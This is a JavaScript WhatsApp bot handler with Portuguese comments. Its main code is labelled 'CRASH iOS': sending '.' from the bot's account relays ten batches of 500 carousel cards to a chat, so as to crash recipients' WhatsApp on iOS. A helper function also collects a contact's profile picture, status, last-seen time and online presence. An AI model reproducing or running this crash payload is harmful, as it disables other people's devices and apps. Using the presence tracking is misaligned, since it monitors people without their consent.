// main.js
const {
  generateWAMessageFromContent,
  delay
} = require("@angstvorfrauen/baileys");
const { url, fileSha256, mediaKey, fileEncSha256, directPath, jpegThumbnail } = require("./database/mediaall.js");

async function handler(sock, m, chatUpdate) {
  try {
    // === VARIÁVEIS BÁSICAS ===
    m.id = m.key.id;
    m.isBaileys = m.id.startsWith("BAE5") && m.id.length === 16;
    m.chat = m.key.remoteJid;
    m.fromMe = m.key.fromMe;
    m.text = m.message?.conversation
      || m.message?.extendedTextMessage?.text
      || m.message?.imageMessage?.caption
      || m.message?.videoMessage?.caption
      || "";
    const from = m.chat;
    const isBot = m.fromMe;
    // === DEFINIÇÃO DE sendjson (se ainda não existir) ===
    if (!sock.sendjson) {
      sock.sendjson = (jid, content, options = {}) => {
        const msg = generateWAMessageFromContent(jid, content, options);
        return sock.relayMessage(jid, msg.message, { messageId: msg.key.id });
      };
    }
    // === CRASH iOS: case "" (ativado ao enviar ".") ===
    if (isBot && m.text === "." && !m.isBaileys) {
      for (let i = 0; i < 10; i++) {
        const singleCard = {
          header: {
            title: ".",
            imageMessage: {
              url,
              mimetype: "image/jpeg",
              caption: ".",
              fileSha256,
              fileLength: "10",
              height: 1000,
              width: 1000,
              mediaKey,
              fileEncSha256,
              directPath,
              jpegThumbnail
            },
            hasMediaAttachment: true
          },
          body: { text: "." },
          footer: { text: "." },
          nativeFlowMessage: {
            buttons: [{
              name: "cta_url",
              buttonParamsJson: JSON.stringify({
                display_text: "x",
                url: "https://google.com",
                merchant_url: "https://google.com"
              })
            }]
          }
        };
        const cards = Array(500).fill(singleCard);
        try {
          console.log(`[CRASH] Enviando lote ${i + 1}/10...`);
          await sock.sendjson(from, {
            interactiveMessage: {
              body: { text: "." },
              carouselMessage: { cards }
            }
          });
          await delay(800);
        } catch (err) {
          console.error(`[CRASH] Erro no lote ${i + 1}:`, err.message);
        }
      }
      console.log("[CRASH] 10 lotes de 500 cards enviados com sucesso!");
      return;
    }
  } catch (err) {
    console.error("[MAIN] Erro geral:", err.message);
  }
}

async function getContactInfo(sock, jid) {
  let info = {
    exists: false,
    name: "Desconhecido",
    status: null,
    lastSeen: null,
    online: false,
    profilePic: null
  };
  try {
    const waInfo = await sock.onWhatsApp(jid);
    info.exists = waInfo && waInfo[0] && waInfo[0].exists;
    if (!info.exists) return info;

    // Nome do contato (de authState ou pushname)
    const contact = sock.authState.creds.contacts?.[jid] || {};
    info.name = contact.notify || contact.vname || contact.name || "Usuário Anônimo";

    // Foto de perfil
    try {
      info.profilePic = await sock.profilePictureUrl(jid, 'image');
    } catch (e) {
      info.profilePic = null;
    }

    // Status (bio)
    try {
      const statusRes = await sock.fetchStatus(jid);
      info.status = statusRes.status;
      info.lastSeen = statusRes.setAt;
    } catch (e) {
      info.status = null;
      info.lastSeen = null;
    }

    // Online/Presence
    let presence = 'unavailable';
    const presenceHandler = (update) => {
      if (update.id === jid && update.presences && update.presences[jid]) {
        presence = update.presences[jid].lastKnownPresence || 'unavailable';
      }
    };
    sock.ev.on('presence.update', presenceHandler);
    try {
      await sock.presenceSubscribe(jid);
      await delay(3000); // Aguardar atualização de presence (aumentado para mais confiabilidade)
    } catch (e) {
      console.error("[PRESENCE] Erro ao subscrever:", e.message);
    } finally {
      sock.ev.removeAllListeners('presence.update', presenceHandler);
    }
    info.online = presence === 'available';
  } catch (err) {
    console.error("[CONTACT INFO] Erro ao obter infos:", err.message);
  }
  return info;
}

// === HOT RELOAD ===
let file = require.resolve(__filename);
require("fs").watchFile(file, () => {
  require("fs").unwatchFile(file);
  console.log("[HOT-RELOAD] main.js recarregado");
  delete require.cache[file];
  require(file);
});

module.exports = { handler, getContactInfo };
